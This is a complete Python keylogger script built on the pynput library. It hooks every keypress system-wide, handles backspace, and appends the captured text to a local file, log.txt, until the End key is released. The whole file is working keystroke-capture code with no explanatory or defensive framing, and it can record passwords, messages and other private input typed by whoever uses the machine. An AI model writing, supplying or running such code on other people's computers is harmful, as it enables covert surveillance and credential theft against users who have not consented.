from pynput.keyboard import Key, Listener

listen = Listener
keys = []


def on_press(key):
    global keys
    keys.append(key)
    if key == Key.backspace:
        keys.pop(-2)
    elif key == Key.space or key == Key.enter:
        write_to_file(keys)
        keys = []


def write_to_file(text):
    with open("log.txt", 'a') as f:
        for key in text:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("enter") > 0:
                f.write("\n")
            elif k.find("Key.") == -1:
                f.write(k)


def on_release(key):
    if key == Key.end:
        return False


with listen(on_press=on_press, on_release=on_release) as listen:
    listen.join()
